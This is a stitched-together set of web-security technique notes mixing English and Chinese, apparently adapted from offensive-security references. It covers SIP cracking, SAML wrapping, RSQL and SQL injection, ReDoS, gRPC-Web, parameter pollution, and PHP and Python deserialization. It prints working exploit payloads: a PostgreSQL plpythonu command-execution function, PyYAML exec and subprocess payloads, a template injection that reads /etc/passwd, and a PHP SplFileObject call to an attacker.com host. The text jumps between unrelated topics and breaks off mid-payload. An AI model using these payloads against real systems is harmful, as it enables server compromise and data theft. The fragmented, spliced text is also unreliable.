It is based on a request-response model, similar to HTTP, and uses methods like INVITE, ACK, BYE, and CANCEL for controlling call sessions. Interoperability: SIP's widespread adoption and standardization ensure better interoperability between different devices, applications, and service providers, promoting seamless communication across various platforms. Via: Via: SIP/2.0/UDP pc33.example.com;branch=z9hG4bK776asdhds：The Via header specifies the transport protocol (UDP) and the client's address (pc33.example.com). The "branch" parameter is used for loop 检测 and transaction matching. CSeq: CSeq: 314159 INVITE：The CSeq header contains a sequence number and the method used in the request. It's used to match responses to requests and detect out-of-order messages. REGISTER request with 认证 凭据: The UA sends another REGISTER request, this time including the "授权" header with the necessary 凭据，such as the username, realm, nonce, and a response value calculated using the provided information and the user's 密码. 枚举 typically abuses differences between 401/407 vs 404/403 on REGISTER/INVITE. Harden servers to reply uniformly. Offline cracking from a pcap is trivial for MD5 digests. After extracting the challenge/response, you can use hashcat mode 11400 (SIP digest, MD5): sips: URIs and TCP/TLS typically on 5061. Verify certificate validation on endpoints; many accept self-signed or wildcard certs, enabling MitM in weak deployments. Simple rate-limiting example for UDP/5060 (Linux iptables hashlimit): Enforce strong passwords and digest algorithms (SHA-256/512-256 where supported; avoid MD5). # 命令 / 载荷 / 操作片段 # 1. So check those for further details. Implication: The validator may get confused between the legitimate "Response -> Assertion -> Subject" and the attacker's "evil new Response -> Assertion -> Subject", leading to data integrity issues. Implication: This exploits the less restrictive schema of the Extensions element to 绕过 schema validation countermeasures, especially in libraries like OpenSAML. Difference from XSW #7: Utilizes another less restrictive XML element for a variant of the attack. You can use the Burp extension SAML Raider to parse the request, apply any XSW attack you choose, and launch it. Impact: If the Service Provider uses vulnerable Ruby-SAML (ex. GitLab SAML SSO), an attacker who can obtain any IdP-signed SAMLResponse can forge a new assertion and authenticate as arbitrary users. High-level workflow (signature-wrapping style 绕过): Idea: abuse response-splitting via newline injection in the reflected RelayState. See also the generic notes in CRLF injection. Other boot/eager-load locations that are executed on app start are also risky when writeable (e.g., config/initializers/is the classic one). If you find an arbitrary file 上传 that lands anywhere under config/and is later evaluated/required, you may obtain RCE at boot. A vulnerable pattern looks like: where params[:t] and/or params[:v] are attacker-controlled. If you only have read-access to generated variants, attempt blind exfiltration via crafted ImageMagick operations. Remediation/detections If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + image processing + mini magick and user-controlled transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a hardened ImageMagick policy. Mitigation: upgrade Rack; ensure :root only points to a directory of public files and is explicitly set. Template injection in Ruby engines (ERB/Haml/Slim, etc.): Ruby load evaluates the target file content as Ruby regardless of file extension. Any readable text file whose contents parse as Ruby will be executed. Pathname#cleanpath collapses . and .. segments without hitting the filesystem, enabling path smuggling: attacker-controlled junk can be prepended for logging while the cleaned path still resolves to the intended file to execute (e.g., ../logs/error.log). By injecting a new to s attribute through JSON, an attacker can make the to s method return "Admin," granting unauthorized privileges. Remote Code Execution: In health check, instance eval executes methods listed in protected methods. If an attacker injects custom method names (like "puts 1"), instance eval will execute it, leading to remote code execution (RCE). This is only possible because there is a vulnerable eval instruction executing the string value of that attribute. Impact Limitation: This 漏洞 only affects individual instances, leaving other instances of User and Admin unaffected, thus limiting the scope of 利用. This isn't vulnerable by default but can be made vulnerable with something like: Hashie’s deep merge method operates directly on object attributes rather than plain hashes. It prevents replacement of methods with attributes in a merge with some exceptions: attributes that end with , !, or ? can still be merged into the object. # 命令 / 载荷 / 操作片段 # 1. Example of a vulnerable configuration: An attacker requesting /styles../secret.txt resolves to /path/styles/../secret.txt In this curl request, the attacker supplied as Referer header a Go template expression: {{readFile "etc/passwd"}}. # 命令 / 载荷 / 操作片段 # 1. 工具 123bypass-url-parser -u "http://127.0.0.1/juicy_403_endpoint/" -s 8.8.8.8 -d bypass-url-parser -u /path/urls -t 30 -T 5 -H "Cookie: me_iz=admin" -H "User-agent: test" bypass-url-parser -R /path/request_file --request-tls -m "mid_paths, end_paths" # 2. X-Forwarded-For 1X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3 # 3. X-Forwarded-For 1proxy_set_header X-Forwarded-For $remote_addr; # 4. Off By Slash 12345678server { location /app/ { # Handles /app/ and anything below, e.g., /app/foo } location /app { # Handles only /app with nothing after OR routes like /application, /appzzz }} # 5. Off By Slash 123location /styles { alias /path/css/;} # 6. Missing Root Location 12345678server { root /etc/nginx; location /hello.txt { try_files $uri $uri/ =404; proxy_pass http://127.0.0.1:8080/; }} # 7. Template Injection 12345:80 { root * / templates respond "You came from {http.request.header.Referer}"} # 8. Template Injection 1curl -H 'Referer: {{readFile "etc/passwd"}}' http://localhost/ # 9. Template Injection 123456789HTTP/1.1 200 OKContent-Length: 716Content-Type: text/plain; charset=utf-8Server: CaddyDate: Thu, 24 Jul 2025 08:00:50 GMTYou came from root:x:0:0:root:/root:/bin/shbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologin # 工具与参考入口 yandex/gixy MegaManSec/Gixy-Next shiblisec/Kyubi laluka / 绕过 - url-parser Root Me：Nginx：Alias Misconfiguration Root Me：Nginx：Root Location Misconfiguration Root Me：Nginx：SSRF Misconfiguration Detectify：Vulnerable Nginx # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 SSTI 服务端模板注入 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Prefix that gets you into the vulnerable subpattern (optional). A final character that forces overall failure so the engine must backtrack through all possibilities (often a character that won’t match the last 令牌，like !). In this writeup you can find this one:<flag>(((((((.))))))*)! In this writeup he used: ^(?=flagprefix).∗.∗.∗.∗.∗.∗.∗.∗!!!!{flag prefix}).*.*.*.*.*.*.*.*!!!!flagprefix).∗.∗.∗.∗.∗.∗.∗.∗!!!! JavaScript (browser/Node): Built‑in RegExp is a backtracking engine and commonly exploitable when regex+input are attacker‑influenced. https://github.com/doyensec/regexploit Find vulnerable regexes and auto‑generate evil inputs. Examples: pip install regexploit Analyze one pattern interactively: regexploit Scan Python/JS code for regexes: regexploit-py path/ and regexploit-js path/ https://github.com/davisjam/vuln-regex-detector End‑to‑end pipeline to extract regexes from a project, detect vulnerable ones, and validate PoCs in the target language. Useful for hunting through large codebases. # 命令 / 载荷 / 操作片段 # 1. Quick timing harness (Python) 123456import re, timepat = re.compile(r'(\w*_)\w*$')for n in [2**k for k in range(8, 15)]: s = 'v' + '_'*n + '!' t0=time.time(); pat.search(s); dt=time.time()-t0 print(n, f"{dt:.3f}s") # 工具与参考入口 this post this writeup this writeup https://github.com/doyensec/regexploit https://devina.io/redos-checker https://github.com/davisjam/vuln-regex-detector https://github.com/tjenkinson/redos-detector https://arxiv.org/abs/2406.11618 https://github.com/google/re2/wiki/WhyRE2 # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/RSQL Injection 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # RSQL Injection 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 RSQL Injection 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 RSQL Injection 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：RSQL Injection、What is RSQL?、Overview、How does it work?、Risks；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 17 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 RSQL Injection What is RSQL? Overview How does it work? Risks Supported RSQL operators Examples Common filters Common parameters Information leakage and 枚举 of users Request Response 授权 规避 权限提升 Impersonate or Insecure Direct Object References (IDOR) 检测 & fuzzing quickwins Framework-specific abuse (Elide / JPA Specification / JSON:API) Automation helpers # 核心要点 If the application does not correctly validate user input, an attacker could manipulate the filter to execute unexpected queries, such as: Exposure of sensitive data: An attacker can retrieve information that should not be accessible. Data modification or deletion: Injection of filters that alter database records. 权限提升: Manipulation of identifiers that grant roles through filters to trick the application by accessing with privileges of other users. Although a /api/registrations?email=<emailAccount> is expected, it is possible to use RSQL filters to attempt to enumerate and/or extract user information through the use of special operators: In this scenario, we start from a user with a basic role and in which we do not have privileged permissions (e.g. administrator) to access the list of all users registered in the database: Many implementations double-parse URL parameters; try double-encoding (,), *, ; (e.g., %2528admin%2529) to 绕过 naive blocklists and WAFs. Range/proximity leaks: filter[users]=createdAt=rng=(2024-01-01,2025-01-01) quickly enumerates by year without knowing exact IDs. Elide and many Spring Data REST projects translate RSQL directly to JPA Criteria. When developers add custom operators (e.g., =ilike=) and build predicates via string concatenation instead of prepared parameters, you can pivot to SQL 注入 (classic 载荷: name=ilike='%%' OR 1=1--'). JSON:API backends commonly expose both include and filter. Filtering on related resources filter[orders]=customer.email==admin may 绕过 top-level ACLs because relation-level filters execute before ownership checks. rsql-parser CLI (Java): java -jar rsql-parser.jar "name=='admin';status==ACTIVE" validates 载荷 locally and shows the abstract syntax tree—useful to craft balanced parentheses and custom operators. Pair with HTTP fuzzer (ffuf, turbo-intruder) by iterating wildcard positions a, e, etc., inside =in= lists to enumerate IDs and emails quickly. # 命令 / 载荷 / 操作片段 # 1. How does it work? 1/products?filter=price>100;category==electronics # 2. How does it work? 1/products?filter=id=in=(1,2,3);delete_all==true # 3. Request 12345678910111213GET /api/registrations HTTP/1.1Host: localhost:3000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0Accept: application/vnd.api+jsonAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, br, zstdContent-Type: application/vnd.api+jsonOrigin: https://localhost:3000Connection: keep-aliveReferer: https://localhost:3000/Sec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-site # 4. SELECT * FROM information schema.table privileges WHERE table name = 'pg language'; Note that it's possible to compile the secure versions as "unsecure". Check this for example. So it's always worth trying if you can execute code even if you only find installed the trusted one. {｛#tab name="Read"}} pl-pgsql - 密码 - bruteforce.md # 命令 / 载荷 / 操作片段 # 1. PostgreSQL Languages 123\dL *SELECT lanname,lanpltrusted,lanacl FROM pg_language; # 2. plpythonu/plpython3u 12345678910CREATE OR REPLACE FUNCTION exec (cmd text)RETURNS VARCHAR(65535) stableAS $$ import os return os.popen(cmd).read() #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})$$LANGUAGE 'plpythonu';SELECT cmd("ls"); #List dir # 5. plpythonu/plpython3u 123456789101112131415161718192021222324CREATE OR REPLACE FUNCTION findw (dir text)RETURNS VARCHAR(65535) stableAS $$ import os def my_find(path): writables = [] def find_writable(path): if not os.path.isdir(path): return if os.access(path, os.W_OK): writables.append(path) if not os.listdir(path): return else: for item in os.listdir(path): find_writable(os.path.join(path, item)) find_writable(path) return writables return ", ".join(my_find(dir))$$LANGUAGE 'plpythonu';SELECT findw("/"); content: 来源路径： 02-知识点/Web安全/Python Yaml Deserialization 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Python Yaml Deserialization 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 Python Yaml Deserialization 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 Python Yaml Deserialization 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：Python Yaml Deserialization、Yaml Deserialization、Basic 利用、Vulnerable .load ("<content>") without Loader、RCE；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Python Yaml Deserialization Yaml Deserialization Basic 利用 Vulnerable .load("<content>") without Loader RCE Tool to create 载荷 # 核心要点 Example on how to execute a sleep: Old versions of pyyaml were vulnerable to deserialisations attacks if you didn't specify the Loader when loading something: yaml.load(data) You can find the description of the 漏洞 here**.** The proposed 利用 in that page is: Note that in recent versions you cannot no longer call .load() without a Loader and the FullLoader is no longer vulnerable to this attack. Custom 载荷 can be created using Python YAML modules such as PyYAML or ruamel.yaml. These 载荷 can 利用 vulnerabilities in systems that deserialize untrusted input without proper sanitization. The tool https://github.com/j0lt-github/python-deserialization-attack - 载荷 - generator can be used to generate python deserialization 载荷 to abuse Pickle, PyYAML, jsonpickle and ruamel.yaml: # 命令 / 载荷 / 操作片段 # 1. Yaml Deserialization 123456789101112131415print(yaml.dump(str("lol")))lol...print(yaml.dump(tuple("lol")))!!python/tuple- l- o- lprint(yaml.dump(range(1,10)))!!python/object/apply:builtins.range- 1- 10- 1 # 2. Yaml Deserialization 12345678910111213141516import yamlfrom yaml import UnsafeLoader, FullLoader, Loaderdata = b'!!python/object/apply:builtins.range [1, 10, 1]'print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)print(yaml.load(data, Loader=Loader)) #range(1, 10)print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>print(yaml.unsafe_load(data)) #range(1, 10)print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>#The other ways to load data will through an error as they won't even attempt to#deserialize the python object # 3. Basic 利用 123456789101112import yamlfrom yaml import UnsafeLoader, FullLoader, Loaderdata = b'!!python/object/apply:time.sleep [2]'print(yaml.load(data, Loader=UnsafeLoader)) #Executedprint(yaml.load(data, Loader=Loader)) #Executedprint(yaml.load_all(data))print(yaml.load_all(data, Loader=Loader))print(yaml.load_all(data, Loader=UnsafeLoader))print(yaml.load_all(data, Loader=FullLoader))print(yaml.unsafe_load(data)) #Executedprint(yaml.full_load_all(data))print(yaml.unsafe_load_all(data)) # 4. Vulnerable .load("<content>") without Loader 123456!!python/object/new:strstate: !!python/tuple - 'print(getattr(open("flag\x2etxt"), "read")())' - !!python/object/new:Warning state: update: !!python/name:exec # 5. Vulnerable .load("<content>") without Loader 1234567!!python/object/new:str { state: !!python/tuple [ 'print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning { state: { update: !!python/name:exec } }, ],} # 6. RCE 1234567891011121314151617import yamlfrom yaml import UnsafeLoader, FullLoader, Loaderimport subprocessclass Payload(object): def __reduce__(self): return (subprocess.Popen,('ls',))deserialized_data = yaml.dump(Payload()) # serializing dataprint(deserialized_data)#!!python/object/apply:subprocess.Popen#- lsprint(yaml.load(deserialized_data, Loader=UnsafeLoader))print(yaml.load(deserialized_data, Loader=Loader))print(yaml.unsafe_load(deserialized_data)) # 7. Tool to create 载荷 12345678910111213141516171819python3 peas.pyEnter RCE command :cat /root/flag.txtEnter operating system of target [linux/windows] . Default is linux :linuxWant to base64 encode payload ? Example HTTP PoC (path injection via ';') If earlier patches quote other args but not the URI in one branch, 载荷 appended at the end of the string often work: ;id# or &&/usr/bin/id# Do not build shell strings. Prefer argument-vector execution: system('/usr/bin/curl', '--silent', '--', $safe url) — no shell. If a shell is unavoidable, escape strictly and consistently across all branches; treat $r->uri() as hostile. Consider URI::Escape for paths/queries and strong allowlists. Avoid backticks/qx// for command execution; capture output via open3/list form if truly needed without invoking a shell. Patch-diff modules that assemble shell commands; look for inconsistent quoting between branches (e.g., if ($type eq 'login') left unescaped). Grep for backticks, qx//, open\s*(|||, and system\s*(\s*" to find string-based shells. Build a call graph from sink to request entry ($r) to verify pre-auth reachability. Pre-auth 命令注入 via backticks in AccessTool.pm:getCASURL when type == "login" concatenated raw uri(uri (uri(r->uri()). Practical nuance: use a resolvable path covered by the handler; otherwise the module won’t execute and the sink won’t be hit. PrestaXSRF: PrestaShop 利用 Script that elevate XSS to RCE or Others Critical Vulnerabilities. For more info check this post. It provides support for PrestaShop Versions 8.X.X and 1.7.X.X, and allows to: (RCE) PSUploadModule ();：上传 a custom Module: 上传 a Persistent Module (backdoor) to PrestaShop. Missing identity validation in the ps checkout module < 5.0.5 lets an unauthenticated attacker switch the session to any customer by supplying their email. Flow: ExpressCheckout.php accepts attacker JSON, only checks orderID, builds ExpressCheckoutRequest and calls ExpressCheckoutAction::execute(). Attacker-controlled email field: order.payer.email address inside the JSON 载荷 is read by ExpressCheckoutRequest::getPayerEmail (). Even if the endpoint returns 500, the response will include cookies for the victim’s customer context (session already switched), enabling PII access or purchasing with saved cards. # 命令 / 载荷 / 操作片段 # 1. Though it's challenging to 绕过 if implemented correctly, its significance in security checks is notable. The use of indexOf() for origin validation in PostMessage events may be susceptible to bypassing. An example illustrating this 漏洞 is: The match() function, similar to search(), processes regex. If the regex is improperly structured, it might be prone to bypassing. Bypassing the escape: In the context of this 漏洞，the File object is notably exploitable due to its read-only name property. This property, when used in templates, is not sanitized by the escapeHtml function, leading to potential security risks. Navigate another attacker window to the relay endpoint on the trusted origin, populating message fields you want injected (message type, tokens, nonces). Because the message now comes from the trusted origin, origin-only validation passes and you can trigger privileged behaviors (state changes, API calls, DOM writes) in the victim listener. Any relay that reflects arbitrary fields into postMessage lets you spoof message types expected by privileged listeners. Combine with weak input validation to reach Graph/REST calls, feature unlocks, or CSRF-equivalent flows. 利用 (origin → script-src pivot): Partner origin isn't a boundary: any XSS in a "trusted" partner lets attackers send allowed messages that 绕过 event.origin checks. Handlers that render partner-controlled 载荷 (e.g., innerHTML on specific message types) make partner compromise a same-origin DOM XSS. Predict the next callback: Convert leaked iframe names back to floats in [0,1) and feed several values (even non-consecutive) into a V8 Math.random predictor (e.g., Z3-based). For binary mode (application/grpc-web), send a framed 载荷 (5‑byte prefix + protobuf message). For text mode, base64‑encode the framed 载荷. A vulnerable setup often reflects arbitrary Origin and sends Access-Control-Allow - 凭据: true, allowing cross‑site authenticated calls. Also check Access-Control-Expose-Headers includes grpc-status, grpc-message (many deployments expose these for client libs). For generic techniques to abuse CORS, check CORS：Misconfigurations & 绕过. gRPC‑Web uses Content-Type: application/grpc-web-text as a base64‑wrapped gRPC frame stream for browser compatibility. You can decode/modify/encode frames to tamper with fields, flip flags, or inject 载荷. Try using gRPC-Scan to parse bundles. Review whether unknown methods/parameters are rejected or passed through. Some configs forward unmatched paths upstream, occasionally bypassing auth or request validation. # 命令 / 载荷 / 操作片段 # 1. Easiest: buf curl (speaks gRPC‑Web natively) 12# list methods (uses reflection)buf curl --protocol grpcweb https://host.tld --list-methods # 2. Easiest: buf curl (speaks gRPC‑Web natively) 1234buf curl --protocol grpcweb \ -H 'Origin: https://example.com' \ -d '{"field":"value"}' \ https://host.tld/pkg.svc.v1.Service/Method # 3. Raw with curl (manual headers + framed body) 12345678910# Build a protobuf message, then gRPC-frame it (1 flag byte + 4 length + msg)# Example using protoscope to compose/edit the message and base64 for grpc-web-textprotoscope -s msg.txt | python3 grpc-coder.py --encode --type grpc-web-text | \ tee body.b64curl -i https://host.tld/pkg.svc.v1.Service/Method \ -H 'Content-Type: application/grpc-web-text' \ -H 'X-Grpc-Web: 1' \ -H 'X-User-Agent: grpc-web-javascript/0.1' \ --data-binary @body.b64 # 4. Check CORS behavior (preflight + response) 1234curl -i -X OPTIONS https://host.tld/pkg.svc.v1.Service/Method \ -H 'Origin: https://evil.tld' \ -H 'Access-Control-Request-Method: POST' \ -H 'Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,grpc-timeout' # 5. Manual with gGRPC Coder Tool 1echo "AAAAABYSC0FtaW4gTmFzaXJpGDY6BVhlbm9u" | python3 grpc-coder.py --decode --type grpc-web-text | protoscope > out.txt # 6. Manual with gGRPC Coder Tool 1234nano out.txt2: {"Amin Nasiri Xenon GRPC"}3: 547: {""} # 7. Manual with gGRPC Coder Tool 1protoscope -s out.txt | python3 grpc-coder.py --encode --type grpc-web-text # 8. Manual with gGRPC Coder Tool 1AAAAADoSFkFtaW4gTmFzaXJpIFhlbm9uIEdSUEMYNjoePHNjcmlwdD5hbGVydChvcmlnaW4pPC9zY3JpcHQ+ # 9. Analysing gRPC‑Web JavaScript files 1python3 grpc-scan.py --file main.js # 10. Bridging and JSON transcoding gotchas 123curl -i https://host.tld/pkg.svc.v1.Service/Method \ -H 'Content-Type: application/json' \ -d '{"field":"value"}' # 工具与参考入口 gprc-coder Hacking into gRPC‑Web Article by Amin Nasiri gRPC‑Web protocol notes (PROTOCOL‑WEB.md) # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

The way parameters are parsed and prioritized depends on the underlying web technology, affecting how HPP can be exploited. Context: A login mechanism requiring a One-Time 密码 (OTP) was exploited. Method: By intercepting the OTP request using 工具 like Burp Suite, attackers duplicated the email parameter in the HTTP request. Attack Vector: An attacker discovers that by appending an additional api key parameter to the POST request, they can manipulate the outcome of the API key update function. Technique: Utilizing a tool like Burp Suite, the attacker crafts a request that includes two api key parameters: one legitimate and one malicious. The server, processing only the last occurrence, updates the API key to the attacker's provided value. Result: The attacker gains control over the victim's API functionality, potentially accessing or modifying private data unauthorizedly. PHP (on Apache HTTP Server): Contrarily, prioritizes the last parameter value, opting for a=2 in the given example. This behavior can inadvertently facilitate HPP exploits by honoring the attacker's manipulated parameter over the original. # 命令 / 载荷 / 操作片段 # 1. Server-Side Parameter Pollution (SSPP) in Internal APIs 1GET /userSearch?name=peter%26name=carlos&back=/home # 2. Server-Side Parameter Pollution (SSPP) in Internal APIs 1GET /users/search?name=peter&name=carlos&publicProfile=true # 3. Duplicate keys 1obj = {"test": "user", "test": "admin"} # 4. Key Collision: Character Truncation and Comments 1234{"test": 1, "test\[raw \x0d byte]": 2}{"test": 1, "test\ud800": 2}{"test": 1, "test"": 2}{"test": 1, "te\st": 2} # 5. Key Collision: Character Truncation and Comments 1234{"role": "administrator\[raw \x0d byte]"}{"role":"administrator\ud800"}{"role": "administrator""}{"role": "admini\strator"} # 6. Using Comment Truncation 1obj = {"description": "Duplicate with comments", "test": 2, "extra": /*, "test": 1, "extra2": */} # 7. Using Comment Truncation 1obj = {"description": "Comment support", "test": 1, "extra": "a"/*, "test": 2, "extra2": "b"*/} # 8. Using Comment Truncation 1{ "description": "Comment support", "test": 1, "extra": "a" } # 9. Using Comment Truncation 1{ "description": "Comment support", "test": 2, "extra": "a", "extra2": "b" } # 10. Inconsistent Precedence: Deserialization vs. Serialization 1234obj = {"test": 1,

content: 来源路径： 02-知识点/Web安全/PHP：RCE abusing object creation- new $ GET-a- 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # PHP：RCE abusing object creation- new $ GET-a- 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 PHP：RCE abusing object creation- new $ GET-a- 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 PHP：RCE abusing object creation- new $ GET-a- 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：PHP：RCE abusing object creation: new $ GET"a"、Introduction、RCE via Custom Classes or Autoloading、RCE via Built-In Classes、SSRF + Phar Deserialization；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 PHP：RCE abusing object creation: new $ GET"a" Introduction RCE via Custom Classes or Autoloading RCE via Built-In Classes SSRF + Phar Deserialization Exploiting PDOs SoapClient/SimpleXMLElement XXE RCE via Imagick Extension VID parser VID Parser + File 上传 PHP Crash + Brute Force Format-string in class-name resolution (PHP 7.0.0 Bug #71105) # 核心要点 This is basically a summary of https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/ The creation of new arbitrary objects, such as new $ GET"a", can lead to Remote Code Execution (RCE), as detailed in a writeup. This document highlights various strategies for achieving RCE. Autoloading functions can be exploited if no such classes are directly accessible. These functions automatically load classes from files when needed and are defined using spl autoload register or autoload: SSRF can lead to deserialization attacks in versions of PHP before 8.0 using the Phar protocol. Versions of PHP up to 5.3.22 and 5.4.12 were susceptible to XXE attacks through the SoapClient and SimpleXMLElement constructors, contingent on the version of libxml2. In the analysis of a project's dependencies, it was discovered that Imagick could be leveraged for command execution by instantiating new objects. This presents an opportunity for exploiting vulnerabilities. Use positional parameters and width specifiers to set an exact byte-count, then %n to write that value to an address reachable on the stack, aiming at a GOT slot (e.g., free) to partially overwrite it to system. Trigger the hijacked function by passing a class name containing a shell pipe to reach system("id"). Typical 载荷 chain many % p to walk the stack, then %.<width>d%<pos>$n to land the partial overwrite. # 命令 / 载荷 / 操作片段 # 1. RCE via Custom Classes or Autoloading 12345678910111213141516class App { function __construct ($cmd) { system($cmd); }}class App2 { function App2 ($cmd) { system($cmd); }}$a = $_GET['a'];$b = $_GET['b'];new $a($b); # 2. RCE via Custom Classes or Autoloading 123456789spl_autoload_register(function ($class_name) { include './../classes/' . $class_name . '.php';});function __autoload($class_name) { include $class_name . '.php';};spl_autoload_register(); # 3. SSRF + Phar Deserialization 1new SplFileObject('http://attacker.com/'); # 4. Exploiting PDOs 1new PDO("sqlite:/tmp/test.txt") # 5. Format-string in class-name resolution (PHP 7.0.0 Bug #71105) 123<?php$model = $_GET['model'];$object = new $model(); # 6. Format-string in class-name resolution (PHP 7.0.0 Bug #71105) 12curl "http://host/index.php?model=%p-%p-%p" # Fatal error includes resolved string with leaked pointers # 工具与参考入口 https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/ https://3v4l.org/2JEGF #71105 The Art of PHP: CTF‑born exploits and techniques # 检查清单 是否定位输入点和服务端解析点 是否验证权限边界 / 租户边界 是否从最小化 payload 开始 是否记录成功与失败条件 # 关联 Web 安全总览 知识地图 SSRF 服务端请求伪造 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/Web安全/PHP：Deserialization + Autoload Classes 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # PHP：Deserialization + Autoload Classes 技术笔记 [!summary] 提炼定位 面向 Web 安全 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 判断、验证或绕过 PHP：Deserialization + Autoload Classes 技术笔记 相关 Web 漏洞。 从输入点、解析链、权限边界、数据落点和回显 / 盲信道五个维度拆解。 # 中文提炼 核心目标是判断 PHP：Deserialization + Autoload Classes 技术笔记 的输入是否能影响服务端解析、权限判断或数据落点。 优先关注：PHP：Deserialization + Autoload Classes、PHP deserialization + spl autoload register + LFI/Gadget、Recent phpggc goodies (2025)、PHPUnit PHPT coverage deserialization (CI/CD entrypoint)、TCPDF destruct POP chain for arbitrary file deletion；从最小 payload 开始证明可控，再扩展到读、写、执行或越权。 验证时把请求方法、参数位置、编码方式、Content-Type、身份状态和响应差异一起记录。 防御视角要补输入规范化、服务端校验、最小权限、日志与告警信号。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 PHP：Deserialization + Autoload Classes PHP deserialization + spl autoload register + LFI/Gadget Recent phpggc goodies (2025) PHPUnit PHPT coverage deserialization (CI/CD entrypoint) TCPDF destruct POP chain for arbitrary file deletion Triggering the gadget via phar:// in html2pdf <cert> tags GiveWP ❤️.14.2 unauthenticated POP chain to RCE (CVE-2024-5932) # 核心要点 If you have a file 上传 and can 上传 a file with .php extension you could abuse this functionality directly and get already RCE. In my case, I didn’t have anything like that, but there was inside the same 容器 another composer web page with a library vulnerable to a phpggc gadget. Now, you can load the others app composer loader, so it’s time to generate the phpgcc 载荷 to use. In my case, I used Guzzle/FW1, which allowed me to write any file inside the filesystem. Now we have the way to load the others app composer loader and have a phpggc 载荷 that works, but we need to do this in the SAME REQUEST for the loader to be loaded when the gadget is used. For that, I sent a serialized array with both objects like: You can see first the loader being loaded and then the 载荷 Summary of the 载荷 Load a phpggc gadget to abuse a library from the other webapp (the initial webapp vulnerable to deserialization didn’t have any gadget on its libraries) The gadget will create a file with a PHP 载荷 on it in /tmp/a.php with malicious commands (the webapp user cannot write in any folder of any webapp) The final part of our 载荷 will use load the generated php file that will execute commands The EQSTLab PoC builds a chain using Stripe\StripeObject and Give\Vendors\Faker\ValidGenerator, sets the internal \0*\0validator to shell exec, and tucks the attacker command in Give\Onboarding\SettingsRepository 